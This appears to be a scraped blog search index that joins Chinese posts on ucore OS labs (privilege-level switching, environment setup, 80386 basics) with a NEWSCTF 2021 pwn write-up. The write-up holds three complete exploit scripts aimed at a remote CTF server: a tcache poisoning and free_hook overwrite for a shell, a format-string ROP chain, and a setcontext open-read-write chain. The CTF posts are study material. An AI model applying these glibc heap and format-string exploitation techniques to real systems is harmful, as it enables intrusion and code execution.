除了系统调用中断(T_SYSCALL)使用陷阱门描述符且权限为用户态权限以外，其它中断均使用特权级(DPL)为０的中断门描述符，权限为内核态权限；而ucore的应用程序处于特权级３，需要采用｀int 0x80`指令操作（这种方式称为软中断，软件中断，Tra中断，在lab5会碰到）来发出系统调用请求，并要能实现从特权级３到特权级０的转换，所以系统调用中断(T_SYSCALL)所对应的中断门描述符中的特权级（DPL）需要设置为３。 char c; switch (tf-\u003etf_trapno) { case IRQ_OFFSET + IRQ_TIMER: ticks++; if(ticks % TICK_NUM ==0) print_ticks(); break; 每100次时钟中断调用print_ticks，这部分看其代码中给的提示很容易编写出来，实验指导中的很模糊。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:6:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习6"},{"categories":["Pwning"],"content":"Challenge 1 为完成挑战请仔细阅读trap相关的代码、test相关代码以及《操作系统真象还原》-特权级深入浅出一章 在所有中断处理程序中都使用__alltraps，它将trapframe保存在栈上。在由内核态切换成用户态的时候，一开始调用中断时，由于是从内核态调用的，没有权限切换，故ss、esp没有压栈，而iret返回时，是返回到用户态，故ss、esp会出栈，于是为了保证栈的正确性，需要在调用中断前将esp减8以预留空间，中断返回后，由于esp被修改，还需要手动恢复esp为正确值。 这样之后，系统特权级已经成功切换，但是由于切换到了用户态，导致IO操作没有权限，故之后的printf无法成功输出，为了能够正常输出，我们需要将eflags中的IOPL设成用户级别，即3，同样也是通过修改栈中值来达到修改的目的。 ring3 -\u003e ring0 // 全局变量 struct trapframe switchk2u; // ...... case T_SWITCH_TOK: if (tf-\u003etf_cs != KERNEL_CS) { tf-\u003etf_cs = KERNEL_CS; // 修改CPL DPL IOPL tf-\u003etf_ds = tf-\u003etf_es = KERNEL_DS; tf-\u003etf_eflags \u0026= ~FL_IOPL_MASK; // 计算将要保存新trapFrame的用户栈地址 // 数值减8是因为内核调用中断时CPU没有压入ss和esp switchu2k = (struct trapframe *)(tf-\u003etf_esp - (sizeof(struct trapframe) - 8)); // 将修改后的trapFrame写入用户栈(注意当前是内核栈)。注意trapFrame中ss和esp的值不需要写入。 memmove(switchu2k, tf, sizeof(struct trapframe) - 8); // 设置弹出esp的值为用户栈的新地址 *((uint32_t *)tf - 1) = (uint32_t)switchu2k; } break; ring0 -\u003e ring3 // 全局变量 struct trapframe *switchu2k; // ...... case T_SWITCH_TOU: if (tf-\u003etf_cs != USER_CS) { // 将中断的栈帧赋给临时中断帧 switchk2u = *tf; // 修改可执行代码段为USER_CS switchk2u.tf_cs = USER_CS; // 修改数据段为USER_DS switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS; // 设置从中断处理程序返回时的栈地址 // 数值减8是因为iret不会弹出ss和esp，所以不需要这8个字节 switchk2u.tf_esp = (uint32_t)tf + sizeof(struct trapframe) - 8; // 为了使得程序在低CPL的情况下仍然能够使用IO // 需要将eflags中对应的IOPL位置成表示用户态的3 switchk2u.tf_eflags |= FL_IOPL_MASK; // 设置中断处理例程结束时pop出的%esp，这样可以用修改后的数据来恢复上下文。 *((uint32_t *)tf - 1) = (uint32_t)\u0026switchk2u; } // 事实上上述代码并没有实际完成一个从内核栈到用户态栈的切换 // 仅仅是完成了特权级的切换。这属于正常现象。 break; 中断 static void lab1_switch_to_user(void) { asm volatile ( \"sub $0x8, %%esp \\n\" \"int %0 \\n\" \"movl %%ebp, %%esp\" : : \"i\"(T_SWITCH_TOU) ); } static void lab1_switch_to_kernel(void) { asm volatile ( \"int %0 \\n\" \"movl %%ebp, %%esp \\n\" : : \"i\"(T_SWITCH_TOK) ); } 最后为了完成挑战不要忘了在kern_init中，开启test。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:7:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#challenge-1"},{"categories":["Pwning"],"content":"Challenge 2使用键盘完成用户态与内核态的切换 case IRQ_OFFSET + IRQ_KBD: c = cons_getc(); // 从控制台获取键盘消息 cprintf(\"kbd [%03d] %c\\n\", c, c); if(c == '0') // 输入 0 进行 用户态到内核态的切换 { if (tf-\u003etf_cs != KERNEL_CS) { cprintf(\"+++ switch to kernel mode +++\\n\"); tf-\u003etf_cs = KERNEL_CS; tf-\u003etf_ds = tf-\u003etf_es = KERNEL_DS; tf-\u003etf_eflags \u0026= ~FL_IOPL_MASK; switchu2k = (struct trapframe *)(tf-\u003etf_esp - (sizeof(struct trapframe) - 8)); memmove(switchu2k, tf, sizeof(struct trapframe) - 8); *((uint32_t *)tf - 1) = (uint32_t)switchu2k; } } else if(c == '3') // 输入 3 进行 内核态到用户态的切换 { if (tf-\u003etf_cs != USER_CS) { cprintf(\"+++ switch to user mode +++\\n\"); switchk2u = *tf; switchk2u.tf_cs = USER_CS; switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS; switchk2u.tf_esp = (uint32_t)tf + sizeof(struct trapframe) - 8; switchk2u.tf_eflags |= FL_IOPL_MASK; *((uint32_t *)tf - 1) = (uint32_t)\u0026switchk2u; } } break; 切换部分的代码与challenge1相同。 check neibelungen@neibelungen:~/os_kernel_lab/labcodes/lab1$ make grade Check Output: (2.5s) -check ring 0: OK -check switch to ring 3: OK -check switch to ring 0: OK -check ticks: OK Total Score: 40/40 ","date":"2021-07-10","objectID":"/ucore-lab-1/:8:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#challenge-2"},{"categories":["Pwning"],"content":"概述 在学习一个东西之前，我都喜欢思考，这个东西解决了什么问题？ 所有的技术都不是无故产生的，面向问题的学习能更好的理解它的设计思路。 操作系统是系统软件，在硬件层与应用软件之间。 为什么需要操作系统？ 为用户提供更加方便的使用计算机的方式。对资源进行有效的管理。 ","date":"2021-07-10","objectID":"/ucore-lab-0/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#概述"},{"categories":["Pwning"],"content":"内核特征 并发 计算机系统中有多个正在运行的程序，需要OS的管理和调度。维护每个进程的状态（寄存器值，当前执行的指令等），并在不同进行之间进行切换（切换由内核态完成后，回到用户态） 共享 宏观上，体现各进程“同时”访问微观上，互斥共享。同一时刻仅有一个进程在访问内存。 系统总线只有一条，不允许多进程同时访问。 虚拟 利用多道程序设计技术，让每个进程都觉得计算机是为该进程独占的 异步 程序的执行不是一贯到底的，而是走走停停，向前推进的速度不可预知 只要运行环境相同，OS需要保证程序运行的结果是相同的 ","date":"2021-07-10","objectID":"/ucore-lab-0/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#内核特征"},{"categories":["Pwning"],"content":"Lab 0：实验环境的搭建可以使用课程提供的完整的VMbox环境，基于Ubuntu 14.04。这个镜像是2015年创建的，所以使用版本较老。 这里我使用Ubuntu 20.04进行，当然如果你可以使用其他的版本（14.04+）。虚拟机的安装略过 ","date":"2021-07-10","objectID":"/ucore-lab-0/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#lab-0实验环境的搭建"},{"categories":["Pwning"],"content":"换源备份原来的源 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 打开/etc/apt/sources.list文件 sudo gedit /etc/apt/sources.list 在前面添加如下条目，并保存 # aliyun deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 然后 sudo apt update sudo apt upgrade ","date":"2021-07-10","objectID":"/ucore-lab-0/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#换源"},{"categories":["Pwning"],"content":"工具安装 sudo apt-get install build-essential git qemu-system vim gdb cgdb make diffutils exuberant-ctags tmux openssh-server cscope meld qgit gitg gcc-multilib gcc-multilib g++-multilib 与官方的并不是完全一样，在ubuntu20.04中eclipse-cdt改变了安装方式，vim由vim-gnome改为vim。 这里我又安装了gdb的拓展peda（在ctf中经常用到），pwndbg在后面发现没法使用。 git clone https://github.com/longld/peda.git ~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit echo \"DONE! debug your program with gdb and enjoy\" vs code用来写代码 sudo apt install snapd -y sudo snap install --classic code ","date":"2021-07-10","objectID":"/ucore-lab-0/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#工具安装"},{"categories":["Pwning"],"content":"Intel 80386基础知识","date":"2021-07-10","objectID":"/ucore-lab-0/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#intel-80386基础知识"},{"categories":["Pwning"],"content":"运行模式 实模式 为了兼容早期16位8086 80386加电启动后处于实模式运行状态，在这种状态下软件可访问的物理内存不能超过1MB，且无法发挥Intel 80386以上级别的32位CPU的4GB内存管理能力 保护模式 支持内存分页机制，提供了对虚拟内存的良好支持。保护模式下80386支持多任务，还支持优先级机制，不同程序运行在不同的优先级上。优先级一共分0-3 4个级别，操作系统运行在最高的的优先级0上，应用程序则运行在比较低的级别上；配合良好的检查机制后，既可以子啊任务间实现数据的安全共享也可以很好地隔离各个任务。 SMM模式 虚拟8086模式 ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#运行模式"},{"categories":["Pwning"],"content":"内存架构地址是访问内存空间的索引 一个地址对应一个字节，借用CSAPP的话，你可以将内存看成数组，地址对应了下标。 一般而言，内存地址有两个：一个是CPU通过总线访问物理内存用到的物理地址，一个是我们编写的应用程序所用到的为虚拟地址（也称逻辑地址）。看下面的程序： int a = 5; int *addr = \u0026a; 指针addr保存了变量a的地址，这个地址就是虚拟地址。 80386是32位的处理器，即可以寻址的物理内存地址空间为$2^{32}=4$字节。为更好理解面向80386处理器的ucore操作系统，需要用到三个地址空间的概念：物理地址、线性地址和虚拟地址。物理内存地址空间是处理器提交到总线上用于访问计算机系统中的内存和外设的最终地址。一个计算机系统中只有一个物理地址空间。线性地址空间是80386处理器通过段（Segment）机制控制下的形成的地址空间。在操作系统的管理下，每个运行的应用程序有相对独立的一个或多个内存空间段，每个段有各自的起始地址和长度属性，大小不固定，这样可让多个运行的应用程序之间相互隔离，实现对地址空间的保护。 在操作系统完成对80386处理器段机制的初始化和配置（主要是需要操作系统通过特定的指令和操作建立全局描述符表，完成虚拟地址与线性地址的映射关系）后，80386处理器的段管理功能单元负责把虚拟地址转换成线性地址，在没有下面介绍的页机制启动的情况下，这个线性地址就是物理地址。 相对而言，段机制对大量应用程序分散地使用大内存的支持能力较弱。所以Intel公司又加入了页机制，每个页的大小是固定的（一般为4KB），也可完成对内存单元的安全保护，隔离，且可有效支持大量应用程序分散地使用大内存的情况。 在操作系统完成对80386处理器页机制的初始化和配置（主要是需要操作系统通过特定的指令和操作建立页表，完成虚拟地址与线性地址的映射关系）后，应用程序看到的虚拟地址先被处理器中的段管理功能单元转换为线性地址，然后再通过80386处理器中的页管理功能单元把线性地址转换成物理地址。 页机制和段机制有一定程度的功能重复，但Intel公司为了向下兼容等目标，使得这两者一直共存。 上述三种地址的关系如下： 分段机制启动、分页机制未启动：逻辑地址—\u003e段机制处理—\u003e线性地址=物理地址 分段机制和分页机制都启动：逻辑地址—\u003e段机制处理—\u003e线性地址—\u003e页机制处理—\u003e物理地址 ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#内存架构"},{"categories":["Pwning"],"content":"寄存器如果对汇编比较熟悉可以直接跳过 80386的寄存器可以分为8组：通用寄存器，段寄存器，指令指针寄存器，标志寄存器，系统地址寄存器，控制寄存器，调试寄存器，测试寄存器，它们的宽度都是32位。一般程序员看到的寄存器包括通用寄存器，段寄存器，指令指针寄存器，标志寄存器。 放出我最喜欢的图（图中展示了64位寄存器到8位寄存器的结构，更高级的CPU还有媒体寄存器） EAX：累加器 EBX：基址寄存器 ECX：计数器 EDX：数据寄存器 ESI：源地址指针寄存器 EDI：目的地址指针寄存器 EBP：基址指针寄存器 ESP：堆栈指针寄存器 Segment Register(段寄存器，也称 Segment Selector，段选择符，段选择子)：除了8086的4个段外(CS,DS,ES,SS)，80386还增加了两个段FS，GS,这些段寄存器都是16位的，用于不同属性内存段的寻址，它们的含义如下： CS：代码段(Code Segment) DS：数据段(Data Segment) ES：附加数据段(Extra Segment) SS：堆栈段(Stack Segment) FS：附加段 GS 附加段 Instruction Pointer(指令指针寄存器，PC)：EIP的低16位就是8086的IP，它存储的是下一条要执行指令的内存地址，在分段地址转换中，表示指令的段内偏移地址。 Flag Register(标志寄存器)：EFLAGS,和8086的16位标志寄存器相比，增加了4个控制位 CF(Carry Flag)：进位标志位； PF(Parity Flag)：奇偶标志位； AF(Assistant Flag)：辅助进位标志位； ZF(Zero Flag)：零标志位； SF(Singal Flag)：符号标志位； IF(Interrupt Flag)：中断允许标志位,由CLI，STI两条指令来控制；设置IF位使CPU可识别外部（可屏蔽）中断请求，复位IF位则禁止中断，IF位对不可屏蔽外部中断和故障中断的识别没有任何作用； DF(Direction Flag)：向量标志位，由CLD，STD两条指令来控制； OF(Overflow Flag)：溢出标志位； IOPL(I/O Privilege Level)：I/O特权级字段，它的宽度为2位,它指定了I/O指令的特权级。如果当前的特权级别在数值上小于或等于IOPL，那么I/O指令可执行。否则，将发生一个保护性故障中断； NT(Nested Task)：控制中断返回指令IRET，它宽度为1位。若NT=0，则用堆栈中保存的值恢复EFLAGS，CS和EIP从而实现中断返回；若NT=1，则通过任务切换实现中断返回。在ucore中，设置NT为0。 ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:3","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#寄存器"},{"categories":["Pwning"],"content":"编程技巧在结构体中定义函数指针和数据形成虚表。 code: lab2/kern/mm/pmm.h // pmm_manager is a physical memory management class. A special pmm manager - XXX_pmm_manager // only needs to implement the methods in pmm_manager class, then XXX_pmm_manager can be used // by ucore to manage the total physical memory space. struct pmm_manager { // XXX_pmm_manager's name const char *name; // initialize internal description\u0026management data structure // (free block list, number of free block) of XXX_pmm_manager void (*init)(void); // setup description\u0026management data structcure according to // the initial free physical memory space void (*init_memmap)(struct Page *base, size_t n); // allocate \u003e=n pages, depend on the allocation algorithm struct Page *(*alloc_pages)(size_t n); // free \u003e=n pages with \"base\" addr of Page descriptor structures(memlayout.h) void (*free_pages)(struct Page *base, size_t n); // return the number of free pages size_t (*nr_free_pages)(void); // check the correctness of XXX_pmm_manager void (*check)(void); }; 对于双向链表的指针域使用统一的结构定义。 struct list_entry { struct list_entry *prev, *next; }; struct Var { type var_1; …… list_entry_t link; }; 使用指针+偏移的方式访问结构体与变量。 // convert list entry to page #define le2page(le, member) \\ to_struct((le), struct Page, member) /* Return the offset of 'member' relative to the beginning of a struct type */ #define offsetof(type, member) \\ ((size_t)(\u0026((type *)0)-\u003emember)) /* * * to_struct - get the struct from a ptr * @ptr: a struct pointer of member * @type: the type of the struct this is embedded in * @member: the name of the member within the struct * */ #define to_struct(ptr, type, member) \\ ((type *)((char *)(ptr) - offsetof(type, member))) ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:4","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#编程技巧"},{"categories":["Writeups"],"content":"题思路基本都是最近见过的，正好学习了一下高版本的堆利用。第一个ak了pwn，还是被挤了下去，体验极差。 ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#"},{"categories":["Writeups"],"content":"ntr_note","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#ntr_note"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/' 有UAF，但是没有show，还是要想办法泄露libc的地址。看到在dele和edit的时候都没有限制idx为负数的情况，所以一开始想直接编辑stdout的FIFE结构，但是怎么试都不成功。 所以利用double free和UAF，通过爆破半字节，申请tcache，然后再爆破半字节申请到_IO_2_1_stdout_，从而leak libc地址，然后改free_hook为system，通过system('/bin/sh')来get shell。 高版本og调栈没有用（恼 ","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec"},{"categories":["Writeups"],"content":"exp from os import system from pwn import * from pwnlib.ui import pause context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) libc = ELF('./libc-2.31.so') def add(size, data): p.sendlineafter('choice \u003e\u003e','1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(data) def dele(idx): p.sendlineafter('choice \u003e\u003e','2') p.recvuntil('idx:') p.sendline(str(idx)) def edit(idx, data): p.sendlineafter('choice \u003e\u003e','4') p.recvuntil('idx:') p.sendline(str(idx)) p.recvuntil('content:') p.send(data) count = 0 while True: try: log.success('{}attempt'.format(count)) # p = process('./ntr_note',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115', 10000) add(0x50, '/bin/sh\\x00') # 0 add(0x30,'/bin/sh\\x00') # 1 dele(0) edit(0,'a'*0x10) dele(0) edit(0,p16(0x3010)) add(0x50, '/bin/sh\\x00') # 2==0 add(0x50, '\\x00'*64+'\\x00'*14+'\\xff'*2) # 3 tcache log.success('tcache get!') dele(0) edit(0,'a'*0x10) dele(2) dele(3) edit(2,p16(0x3010)) add(0x50,b'/bin/sh\\x00') # 4 # gdb.attach(p) edit(3,p16(0x36a0)) add(0x50,'a'*0x20) # 5 add(0x50,p64(0xfbad1800)+p64(0)*3+b'\\x00') # 6 libc_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = libc_addr - libc.sym['_IO_2_1_stdin_'] leak('libcbase', libcbase) system = libcbase + libc.sym['system'] free_hook = libcbase + libc.sym['__free_hook'] log.success('libc addr get!') pause() edit(3,p64(0)*10) dele(1) edit(1,p64(free_hook)*3) edit(3,'\\xff'*30) add(0x30, '/bin/sh\\x00') # 7 add(0x30, p64(system)) # 8 dele(7) p.interactive() except: count = count+1 p.close() ","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp"},{"categories":["Writeups"],"content":"61happy","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#61happy"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-littl RELRO: Full RELRO Stack: No canary foun NX: NX enabled PIE: PIE enabled 无限的格式化字符串，在栈上找栈链，并leak各段的基址。通过栈链，控制栈上一个指针指向返回地址，最后退出程序执行rop。 这个题我用og一个也没有成功，单纯的pop rdi ret还会覆盖我的栈链，所以选择了pop rdi rbp ret，从而跳过栈链，最后通过system('/bin/sh')来get shell。 ","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec-1"},{"categories":["Writeups"],"content":"exp from pwn import * # context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # p = process('./qiandao',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115',10001) libc = ELF('./libc-2.31.so') def write(offset, gadget): # point to ret addr payload = '%{}c%9$hhn'.format(offset) p.send(payload.ljust(0x64,'\\x00')) # overwrite 1 bytes payload= '%{}c%37$hhn'.format(gadget) p.send(payload.ljust(0x64,'\\x00')) payload = '||%p||%7$p||%9$p||' # text, libc, stack p.sendline(payload) p.recvuntil('||') text_base = int(p.recvuntil('||',drop=True),16) - 0x914 libc_base = int(p.recvuntil('||',drop=True),16) - 243 - libc.sym['__libc_start_main'] stack_addr = int(p.recvuntil('||',drop=True),16) ret_addr = stack_addr - 0xf0 leak('text base', text_base) leak('libc base', libc_base) leak('ret_addr', ret_addr) pop_rdi = libc_base + 0x276e9 system = libc_base + libc.sym['system'] binsh = libc_base + 0x1b75aa offset = ret_addr\u00260xffff print(hex(offset)) gadget = [ pop_rdi\u00260xff, (pop_rdi\u003e\u003e8)\u00260xff, (pop_rdi\u003e\u003e16)\u00260xff, (pop_rdi\u003e\u003e24)\u00260xff, (pop_rdi\u003e\u003e32)\u00260xff ] leak('pop rdi',pop_rdi) string = [ binsh \u00260xff, (binsh\u003e\u003e8)\u00260xff, (binsh\u003e\u003e16)\u00260xff, (binsh\u003e\u003e24)\u00260xff, (binsh\u003e\u003e32)\u00260xff ] leak('bin sh',binsh) func = [ system\u00260xff, (system\u003e\u003e8)\u00260xff, (system\u003e\u003e16)\u00260xff, (system\u003e\u003e24)\u00260xff, (system\u003e\u003e32)\u00260xff, (system\u003e\u003e40)\u00260xff ] leak('system',system) # point to ret addr payload = '%{}c%9$hn'.format(offset) p.send(payload.ljust(0x64,'\\x00')) # overwrite 1 bytes payload= '%{}c%37$hhn'.format(gadget[0]) p.send(payload.ljust(0x64,'\\x00')) offset = ret_addr\u00260xff write(offset+1, gadget[1]) offset = offset + 8 write(offset, string[0]) write(offset+1, string[1]) write(offset+2, string[2]) offset = offset + 16 write(offset, func[0]) write(offset+1, func[1]) write(offset+2, func[2]) write(offset+3, func[3]) write(offset+4, func[4]) write(offset+5, func[5]) p.sendline('61happy'.ljust(0x64,'\\x00')) p.interactive() ","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp-1"},{"categories":["Writeups"],"content":"super_note","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#super_note"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/' 与第一题的劫持思路差不多，这次ntr师傅好心给了你堆地址的low 2 bytes（淦！） 这样我们就可以劫持tcache了，之后还是通过爆破半字节申请到_IO_2_1_stdout_，从而leak libc地址。然后，劫持free_hook为puts_addr，这样我们就可以泄露栈（environ）和堆的地址了。接着，劫持tcache的指针部分，配合劫持free_hook。我们可以任意地址读写。 这里我本来是想在栈上构造orw，然后shutdown来执行的，结果main根本没有ret指令（ 所以还是要通过setcontext来进行栈迁移，先通过任意地址读写，在一段连续的空间写我们的orw。然后，再找一块空间用来进行setcontext的寄存器设置。在高版本的libc中setcontext的寄存器与rbx有关了，还有通过一个gadget来控制rdx的值 用ropper找 ropper -f ./libc-2.31.so --search 'mov rdx' 发现这样一个gadget 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 把free_hook覆盖为这个gadget，可以通过rdi控制rdx，进而在rdx + 0x20的位置写setcontext + 61的地址就可以执行orw。 这里还要注意rcx的值会影响rsp。 ","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec-2"},{"categories":["Writeups"],"content":"exp from os import write from pwn import * from pwnlib.ui import pause context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # # p = process('./super_note',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115', 10002) libc = ELF('./libc-2.31.so') def add(idx, size): p.sendlineafter('choice:','1') p.recvuntil('index:') p.sendline(str(idx)) p.recvuntil('size:') p.sendline(str(size)) def edit(idx, data): p.sendlineafter('choice:','2') p.recvuntil('index:') p.sendline(str(idx)) p.recvuntil('content:') p.send(data) def show(idx): p.sendlineafter('choice:','3') p.recvuntil('index:') p.sendline(str(idx)) def dele(idx): p.sendlineafter('choice:','4') p.recvuntil('index:') p.sendline(str(idx)) # double free add(0,0x50) # 0 show(0) p.recvuntil('address:[') heap_base = int(p.recvuntil(']\\n',drop=True),16) - 0x3a0 - 0x1000 - 0x560 tcache = heap_base + 0x10 leak('heap base',heap_base) add(1,0x30) # 1 dele(0) # 0 edit(0,'a'*0x10) dele(0) # 0-0 edit(0,p16(tcache)) # 0-tcache add(0,0x50) # -tcache add(2, 0x50) # tcache edit(2,'\\x00'*64+'\\x00'*14+'\\xff'*2) log.success('tcache get!') dele(0) # 0 edit(0,'a'*0x10) dele(0) # 0-0 dele(2) # ub-tcache edit(0,p16(tcache)) # 0-tcache add(0, 0x50) # -tcache edit(2,p16(0x26a0)) # -tcache-stdout add(3, 0x50) # tcache edit(3,'a'*0x20) add(4, 0x50) # stdout edit(4,p64(0xfbad1800)+p64(0)*3+b'\\x00') libc_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = libc_addr - libc.sym['_IO_2_1_stdin_'] leak('libcbase', libcbase) puts_addr = libcbase + libc.sym['puts'] free_hook = libcbase + libc.sym['__free_hook'] # 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; getkeyserv_handle = libcbase + 0x1547a0 open_addr = libcbase + libc.sym['open'] read_addr = libcbase + libc.sym['read'] write_addr = libcbase + libc.sym['write'] setcontext = libcbase + libc.sym['setcontext'] +61 pop_rdi = libcbase + 0x26b72 pop_rsi = libcbase + 0x27529 pop_rax = libcbase + 0x4a550 pop_rsp = libcbase + 0x32b5a pop_rax_rdx_rbx = libcbase + 0x1626d5 syscall_ret = libcbase + 0x66229 log.success('libc addr get!') edit(3,p64(0)*10) # tcache dele(1) # 0x40-\u003e1 edit(1,p64(free_hook)) # 1-\u003efree_hook edit(3,'\\xff'*30) add(1,0x30) add(5,0x30) # free_hook edit(5,p64(puts_addr)) dele(0) heap_base = u64(p.recvuntil(b'\\x0a',drop=True)[-6:].ljust(8,b'\\x00')) - 0x10 leak('heap base',heap_base) orw_part_1 = heap_base + 0x2000 orw_part_2 = orw_part_1 + 0x60 set_chunk = orw_part_2 + 0x60 edit(5,p64(0)) edit(5,p64(0)) add(6,0x60) edit(3,p16(1)*10) dele(6) edit(6,p64(heap_base+0x90)) # tcache entry* add(6,0x60) add(6,0x60) edit(6,p64(orw_part_1)*12) edit(3,p16(7)*10) add(8,0x60) flag = orw_part_1 + 0x60 + 9*8 # open('./flag',0) payload = p64(pop_rdi)+p64(666)+p64(pop_rdi) + p64(flag) + p64(pop_rax) + p64(2) + p64(syscall_ret) # read(3, flag+8, 0x100) payload+= p64(pop_rdi) + p64(3) +p64(pop_rsi)+p64(flag+8)+ p64(pop_rax_rdx_rbx) # + p64(0) +p64(heap_base) #+p64(heap_base)+p64(0) + p64(syscall_ret) edit(8,payload) edit(3,p16(7)*10) edit(6,p64(orw_part_2)*12) add(9,0x60) payload = p64(0) +p64(0x100)+p64(0) + p64(syscall_ret) # write(1,flag+8,0x100) payload+= p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall_ret) + b'./flag\\x00' edit(9,payload) edit(6,p64(set_chunk)*12) add(10,0x60) payload = p64(0) + p64(set_chunk) +p64(0)*2+ p64(setcontext) edit(10,payload.ljust(0x60,'\\x00')) edit(6,p64(set_chunk+0x60)*12) add(11,0x60) payload = p64(0)*3 + p64(orw_part_1) + p64(80) + p64(88) + p64(0)+p64(0)+p64(orw_part_1+0x8) + p64(pop_rdi) edit(11,payload.ljust(0x60,'\\x00')) # gdb.attach(p,'b *free') edit(5,p64(getkeyserv_handle)) log.success('start aaattttack !!!!!!!!!!!') dele(10) # edit(3,p64(0)*10) # tcache # dele(1) # 0x40-\u003e1 # edit(1,p64(env)) # 1-\u003eenv # edit(3,'\\xff'*30) # add(1,0x30) # add(6,0x30) # env # edit(5,p64(puts_addr)) # dele(6) # stack_addr = u64(","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp-2"},{"categories":["Writeups"],"content":"签到%3D改成=，扔到cyberchef ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#签到"},{"categories":["Writeups"],"content":"RAS256 def RSA_File(): public_name = input(\"请输入公钥文件名(没有直接回车)：\") flag_name = input(\"请输入加密文件名：\") private_name = input(\"请输入私钥文件名(没有直接回车)：\") with open(flag_name, 'rb') as f: c = bytes_to_long(f.read()) if private_name == \"\": pass else: with open(private_name, 'r') as private: Key = 